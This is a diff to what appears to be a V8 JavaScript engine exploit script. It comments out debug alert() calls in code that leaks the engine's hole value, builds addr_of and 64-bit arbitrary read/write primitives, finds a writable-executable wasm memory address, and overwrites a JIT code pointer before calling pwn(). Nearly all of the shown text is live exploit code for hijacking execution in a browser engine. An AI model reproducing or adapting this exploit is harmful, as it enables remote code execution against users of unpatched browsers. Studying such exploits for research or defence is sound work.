@@ -383,14 +383,14 @@ function leak_hole() {
       var dataview1 = new DataView(buf1);
   
       the.hole = leak_hole();
-      alert(the.hole);
+      //alert(the.hole);
       install_primitives();
   
       let instance_addr = addr_of(wasmInstance);
       // %DebugPrint(buf1);
-      alert("[+]wasm instance addr : " + hex(instance_addr));
+      //alert("[+]wasm instance addr : " + hex(instance_addr));
       let rwx_addr = v8_read64(instance_addr-1n+0x60n);
-      alert("[+]rwx addr : " + hex(rwx_addr));
+      //alert("[+]rwx addr : " + hex(rwx_addr));
       let buf_addr = addr_of(buf1);
       console.log("[+]buf_addr : " + hex(buf_addr));
       var foo_addr = addr_of(foo);
@@ -409,7 +409,7 @@ function leak_hole() {
   
       v8_write64(f_x_code_addr+0x7n+0x8n,jit_addr+0xb3n+0x6n);
       // %DebugPrint(f_x);
-      alert("target : " + hex(jit_addr+0xb3n+0x6n));
+      //alert("target : " + hex(jit_addr+0xb3n+0x6n));
       f_x();
   }
   pwn();
